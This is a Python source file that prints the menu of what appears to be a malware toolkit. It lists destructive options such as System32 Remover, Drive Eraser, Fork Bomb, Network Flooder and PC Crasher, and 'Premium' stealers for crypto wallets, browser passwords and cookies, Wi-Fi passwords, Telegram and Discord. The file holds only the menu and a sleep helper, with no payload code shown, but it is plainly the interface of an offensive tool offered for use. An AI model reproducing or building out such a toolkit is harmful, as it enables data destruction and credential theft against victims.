import time

from files import colors
from rgbprint import Color
c = colors

cyan = Color.cyan          
red = Color.red           
blue = Color.blue          
w = Color.white            


def menu():
    print(f"""
    {cyan}[1]{red} EXIT
    {cyan}[2]{red} Application Bomber    
    {cyan}[3]{red} Auto Shutdown
    {cyan}[4]{red} CapsLock Toggle
    {cyan}[5]{red} Danger Zone
    {cyan}[6]{red} Registry Eraser
    {cyan}[7]{red} System32 Remover
    {cyan}[8]{red} Drive Eraser
    {cyan}[9]{red} Fork Bomb
    {cyan}[10]{red} Internet Disabler
    {cyan}[11]{red} Network Flooder
    {cyan}[12]{red} PC Crasher
    {cyan}[13]{red} PC Crasher 2
    {cyan}[14]{red} Shut Down{cyan}(Not Dangerous)
    {cyan}[15]{red} Shut UP Internet
    {cyan}[16]{red} Stop Internet
    {cyan}[17]{red} System Eraser
    {cyan}[18]{red} System Melter
    {cyan}[19]{red} The Matrix
    {cyan}[20]{red} Time Bomb{cyan}(Needs configuration)
    
    {w}[$] {cyan}#######  Premium  #######
    
    {w}[21] {blue}Crypto Wallet Stealer
    {w}[22] {blue}Browser Passwords, Cookies, Hist stealer
    {w}[23] {blue}Wifi Password Stealer
    {w}[24] {blue}Telegram Stealer
    {w}[25] {blue}Discord Stealer
    """)


def sleep(n):
    time.sleep(n)
